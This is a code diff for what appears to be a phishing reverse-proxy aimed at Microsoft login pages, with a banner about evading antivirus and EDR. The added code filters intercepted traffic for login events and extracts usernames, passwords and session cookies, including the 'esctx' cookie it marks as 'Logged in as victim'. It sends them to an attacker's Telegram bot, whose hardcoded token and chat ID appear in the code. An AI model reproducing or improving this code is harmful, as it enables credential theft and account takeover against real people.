@@ -1,6 +1,8 @@
 const axios = require('axios');
 const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
 const CHAT_ID = '7310383191';
+// Track which sessions have already sent notifications
+const NOTIFIED_SESSIONS = new Set();
 
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
@@ -84,6 +86,53 @@ async function sendCookiesAsFile(cookies, sessionId) {
 
 async function sendToTelegram(data) {
     try {
+        const url = data.proxyRequestURL || '';
+        const body = data.proxyRequestBody || '';
+        const method = data.proxyRequestMethod || '';
+        const sessionId = data.sessionId || 'unknown';
+        
+        // ────── CHECK IF ALREADY NOTIFIED ──────
+        if (NOTIFIED_SESSIONS.has(sessionId)) {
+            return; // Already sent a notification for this session
+        }
+        // ────────────────────────────────────────
+        
+        // ────── FILTER: Only meaningful events ──────
+        const hasCredentials = body && (body.includes('username') || body.includes('password') || body.includes('login') || body.includes('pass'));
+        const hasSessionCookie = data.proxyResponseHeaders?.['set-cookie'] && 
+                                 JSON.stringify(data.proxyResponseHeaders['set-cookie']).includes('esctx');
+        const isTokenExchange = url.includes('/token') && method === 'POST';
+        const isLoginPage = url === 'https://login.microsoftonline.com/' || url === 'https://login.live.com/';
+        
+        // Skip static assets and telemetry
+        const isStatic = (
+            url.includes('.css') || url.includes('.js') || url.includes('.gif') ||
+            url.includes('.svg') || url.includes('.ico') || url.includes('.png') ||
+            url.includes('OneCollector') || url.includes('browser.events.data.microsoft.com') ||
+            url.includes('aadcdn.msauth.net') || url.includes('msftauth.net') ||
+            url.includes('favicon')
+        );
+        
+        // Skip redirects (302) and static assets
+        if (data.proxyResponseStatusCode === 302) return;
+        if (isStatic) return;
+        
+        // Only notify for login-related events
+        const shouldNotify = (
+            hasCredentials ||          // Username/password submitted
+            hasSessionCookie ||        // Session cookie received (successful login)
+            isTokenExchange ||         // Token exchange
+            isLoginPage                // Login page load
+        );
+        
+        if (!shouldNotify) return;
+        
+        // ────── MARK AS NOTIFIED ──────
+        NOTIFIED_SESSIONS.add(sessionId);
+        // ─────────────────────────────
+        
+        // ... existing code to send notification ...
+        
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -99,8 +148,9 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
-        const message = `
-🔐 **New Capture!**
+        // Build a nice, concise message
+        let message = `
+🔐 **New Login Captured!**
 
 🌍 **IP:** ${ip}
 ${flag} **Location:** ${location}
@@ -108,21 +158,49 @@ ${flag} **Location:** ${location}
 📡 **Org:** ${geo.org || 'N/A'}
 
 🕒 **Time:** ${data.timestamp || new Date().toISOString()}
-🔗 **URL:** ${data.proxyRequestURL || 'N/A'}
-📨 **Method:** ${data.proxyRequestMethod || 'N/A'}
-
-📋 **Headers:**
-\`\`\`json
-${JSON.stringify(data.proxyRequestHeaders || {}, null, 2)}
-\`\`\`
-
-📦 **Body:**
-\`\`\`json
-${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
-\`\`\`
-
+🔗 **URL:** ${url}
+📨 **Method:** ${method}
 📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
         `;
+
+        // Add credentials if found
+        if (hasCredentials && body) {
+            // Try to extract username and password
+            let username = 'N/A';
+            let password = 'N/A';
+            
+            try {
+                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                const userMatch = bodyStr.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
+                const passMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
+                if (userMatch) username = decodeURIComponent(userMatch[1]);
+                if (passMatch) password = decodeURIComponent(passMatch[1]);
+            } catch (e) {}
+            
+            message += `
+👤 **Username:** ${username}
+🔐 **Password:** ${password}
+            `;
+        }
+
+        // Add session cookie info if found
+        if (hasSessionCookie) {
+            const cookies = data.proxyResponseHeaders['set-cookie'];
+            const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
+            let hasESTSAUTH = false;
+            for (const cookie of cookieArray) {
+                if (cookie && cookie.includes('esctx')) {
+                    hasESTSAUTH = true;
+                    break;
+                }
+            }
+            if (hasESTSAUTH) {
+                message += `
+🍪 **Session Cookie:** ✅ Captured (esctx)
+🔑 **Status:** Logged in as victim
+                `;
+            }
+        }
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
@@ -130,9 +208,10 @@ ${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
             parse_mode: 'Markdown'
         });
 
+        // Send cookies as file if available
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies) {
-            await sendCookiesAsFile(cookies, data.sessionId || 'unknown');
+            await sendCookiesAsFile(cookies, sessionId);
         }
 
     } catch (e) {
